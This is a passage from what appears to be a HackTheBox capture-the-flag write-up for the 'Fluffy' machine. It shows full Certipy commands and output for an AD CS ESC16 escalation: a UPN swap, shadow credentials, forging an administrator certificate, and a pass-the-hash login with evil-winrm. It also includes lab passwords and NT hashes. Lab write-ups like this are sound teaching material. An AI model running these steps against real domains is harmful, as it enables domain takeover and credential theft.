    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : fluffy-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDn
```

- We see `ESC16` Vulnerabilities go to [Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) here to read about it and how to exploit it. 
## ESC16 Exploitation with Certipy

- In our case `victim` is `ca_svc`.
###  Step 1: **Read initial UPN of the victim account**

- The **User Principal Name (UPN)** is the user’s **login identity in the format of an email address**: `<username>@<domain>.`

```bash
~/Hentai/HTB/fluffy 8s certipy-venv ❯ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-06-17T12:49:19+00:00
```
### **Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`**

```bash
~/Hentai/HTB/fluffy certipy-venv ❯ certipy account \ 
    -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
    -dc-ip '10.10.11.69' -upn 'administrator' \
    -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
### **Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**

- We don't need to do this since we already have `NT` Hash to authenticate but let's do it anyways.

```bash
~/Hentai/HTB/fluffy certipy-venv ❯ certipy shadow \  
    -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
    -dc-ip '10.10.11.69' -account 'ca_svc' \
    auto
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fee645ec0bcc4bb6bdfbe51991c0c41b'
[*] Adding Key Credential with device ID 'fee645ec0bcc4bb6bdfbe51991c0c41b' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'fee645ec0bcc4bb6bdfbe51991c0c41b' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

```bash
export KRB5CCNAME=ca_svc.ccache
```
### **Step 4: Request a certificate as the "victim" user from _any suitable client authentication template_ (e.g., "User")**

```bash
~/Hentai/HTB/fluffy certipy-venv ❯ certipy req \                  
    -k -dc-ip '10.10.11.69' \                     
    -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' \
    -template 'User'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
### **Step 5: Revert the "victim" account's UPN.**

```bash
~/Hentai/HTB/fluffy 19s certipy-venv ❯ certipy account \ 
    -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
    -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' \
    -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
### **Step 6: Authenticate as the target administrator.**

```bash
~/Hentai/HTB/fluffy 6s certipy-venv ❯ certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

- Yusss! We go the Hash now we can just perform Pass the Hash to connect.
# Root by Pass The Hash

```bash
~/Hentai/HTB/fluffy certipy-venv ❯ evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/17/2025   6:01 PM                scripts
d-----        5/19/2025   3:33 PM                WindowsPowerShell


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/16/2025  11:59 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e96a0609a3b31e9b26bfecc596752945
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
# NICE.

![[misato.gif]]

---


